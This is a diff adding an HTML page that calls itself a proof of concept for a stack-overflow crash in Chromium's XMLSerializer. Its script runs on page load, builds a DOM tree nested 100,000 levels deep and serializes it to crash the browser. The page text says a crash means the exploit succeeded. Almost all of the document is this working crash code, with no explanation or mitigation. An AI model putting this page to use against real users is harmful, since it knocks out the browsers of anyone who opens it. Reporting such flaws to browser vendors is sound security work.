@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Chromium XMLSerializer Stack Overflow PoC</title>
+<script>
+
+function createDeepTree(doc, depth) {
+
+    const root = doc.createElement("root");
+    let current = root;
+
+    for (let i = 0; i < depth; i++) {
+
+        const child = doc.createElement(`child_${i}`);
+        current.appendChild(child);
+        current = child; 
+    }
+    return root;
+}
+
+function crashBrowserStackOverflow() {
+    console.log("Attempting to crash the browser with Stack Overflow...");
+
+    const serializer = new XMLSerializer();
+
+    const TARGET_DEPTH = 100000; 
+
+    try {
+        const deepTreeRoot = createDeepTree(document, TARGET_DEPTH);
+
+        console.log(`Created deep tree with depth: ${TARGET_DEPTH}. Attempting to serialize...`);
+        
+        const serialized = serializer.serializeToString(deepTreeRoot);
+        
+        console.log(`Serialization finished. Length: ${serialized.length}. Browser may not have crashed.`);
+
+    } catch (e) {
+        console.error("Error during serialization:", e);
+        console.log("Browser might have crashed or hit an error, or caught the error.");
+    }
+    console.log("Test finished.");
+}
+
+window.onload = crashBrowserStackOverflow;
+</script>
+</head>
+<body>
+    <h1>XMLSerializer Stack Overflow PoC</h1>
+    <p>This page attempts to trigger a browser crash using a potential Stack Overflow vulnerability in XMLSerializer by creating a deeply nested DOM tree.</p>
+    <p>If the browser crashes, the exploit was successful.</p>
+</body>
+</html>
